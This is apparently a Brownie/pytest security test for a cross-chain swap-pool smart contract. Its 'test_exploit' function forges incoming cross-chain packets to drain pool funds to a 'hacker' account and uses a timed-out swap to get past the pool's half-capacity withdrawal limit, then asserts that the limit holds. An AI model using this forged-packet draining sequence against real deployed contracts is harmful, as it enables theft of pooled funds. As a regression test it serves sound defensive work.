import brownie
import pytest

from brownie import ZERO_ADDRESS
from utils.common import SwapPoolInfo
from utils.swap_utils import payloadConstructor, LiquidityPayloadConstructor

@pytest.fixture(autouse=True)
def isolation(module_isolation):
    pass


# Setup testing environment *****************************************************************************************************

# Define accounts
@pytest.fixture(scope="module")
def deployer(accounts):
    yield accounts[1]


@pytest.fixture(scope="module")
def hacker(accounts):
    yield accounts[5]


# Define and init swap pools
depositValues = [10 * 10**18, 1000 * 10**18, 1000 * 10**6, 1000 * 10**18]   # Values correspond to the different tokens from the 'tokens' fixture

@pytest.fixture(scope="module")
def swappool1_info(deploy_swappool, tokens, deployer):

    # Swap pool params
    tokens        = tokens[:1]
    balances      = depositValues[:1]
    weights       = [1]
    amplification = 2**64
    name          = "Pool 1"
    symbol        = "P1"

    swappool = deploy_swappool(tokens, balances, amplification, name, symbol, weights, deployer)

    yield SwapPoolInfo(swappool, tokens, balances, weights, amplification, 0, 0, name, symbol, deployer)

@pytest.fixture(scope="module")
def swappool2_info(deploy_swappool, tokens, deployer):

    # Swap pool params
    tokens        = [tokens[3]]
    balances      = [depositValues[3]]
    weights       = [1]
    amplification = 2**64
    name          = "Pool 2"
    symbol        = "P2"

    swappool = deploy_swappool(tokens, balances, amplification, name, symbol, weights, deployer)

    yield SwapPoolInfo(swappool, tokens, balances, weights, amplification, 0, 0, name, symbol, deployer)

@pytest.fixture(scope="module", autouse=True)
def swappool_group(chainId, swappool1_info, swappool2_info, deployer):
    """
        This fixture is used to setup the swappool group. Tests don't need to use it in any manner.
    """

    # Create connections between pools
    swappool1_info.swappool.setConnection(
        chainId,
        brownie.convert.to_bytes(swappool2_info.swappool.address.replace("0x", "")),
        True,
        {"from": deployer},
    )
    swappool2_info.swappool.setConnection(
        chainId,
        brownie.convert.to_bytes(swappool1_info.swappool.address.replace("0x", "")),
        True,
        {"from": deployer},
    )

    yield [swappool1_info, swappool2_info]


def test_exploit(
    swappool1_info,
    swappool2_info,
    ibcemulator,
    crosschaininterface,
    hacker,
    gov,
    chainId
):

    sp1 = swappool1_info.swappool
    sp2 = swappool2_info.swappool

    target_token = swappool1_info.tokens[0]

    assert target_token.balanceOf(hacker) == 0

    # Extract half of the pool (reach limit)
    max_units = sp1.getUnitCapacity() - 1

    fake_payload = payloadConstructor(
        sp2.address,
        sp1.address,
        brownie.convert.to_bytes(hacker.address),
        max_units,
        0,
    )
    fake_packet = [["", ""], ["", ""], 0, fake_payload, [0, 0]]
    crosschaininterface.onRecvPacket(fake_packet, {"from": ibcemulator})

    # At this point the hacker has extracted 1/2 of the pool
    stolen_funds_balance = target_token.balanceOf(hacker)
    print("Stolen funds:", stolen_funds_balance)
    print("Left in pool:", target_token.balanceOf(sp1))
    print("")

    # Try to extract more
    with brownie.reverts():
        fake_payload = payloadConstructor(
            sp2.address,
            sp1.address,
            brownie.convert.to_bytes(hacker.address),
            max_units,
            0,
        )
        fake_packet = [["", ""], ["", ""], 0, fake_payload, [0, 0]]

        tx = crosschaininterface.onRecvPacket(fake_packet, {"from": ibcemulator})

    # With the stolen funds, send a cross chain swap (knowing that it will fail)
    target_token.approve(sp1, stolen_funds_balance, {"from": hacker})
    tx_send_asset = sp1.sendAsset(
        chainId,
        brownie.convert.to_bytes(sp2.address.replace("0x", "")),
        brownie.convert.to_bytes(gov.address.replace("0x", "")),
        target_token,
        0,
        stolen_funds_balance,
        0,
        0,
        hacker,
        {"from": hacker},
    )

    # Extract more
    max_units = sp1.getUnitCapacity() - 1
    assert max_units == 0  # If time pass this will fail. Ideally this test should factor in passed time.

    fake_payload = payloadConstructor(
        sp2.address,
        sp1.address,
        brownie.convert.to_bytes(hacker.address),
        max_units,
        0,
    )
    fake_packet = [["", ""], ["", ""], 0, fake_payload, [0, 0]]
    crosschaininterface.onRecvPacket(fake_packet, {"from": ibcemulator})


    # Swap times out
    ibcemulator.timeout(
        tx_send_asset.events["IncomingMetadata"]["metadata"][0],
        tx_send_asset.events["IncomingPacket"]["packet"],
        {"from": gov},
    )

    print("Stolen funds:", target_token.balanceOf(hacker))
    print("Left in pool:", target_token.balanceOf(sp1))
    print("")
    # If the balance of the 'hacker' exceeds the balance of the pool, it means the security limit was exploited, as the hacker 
    # starts with an asset balance of 0, and the security limit should prevent more than half of the pool from being stolen.
    assert target_token.balanceOf(hacker) < target_token.balanceOf(sp1), "Pool was exploited"
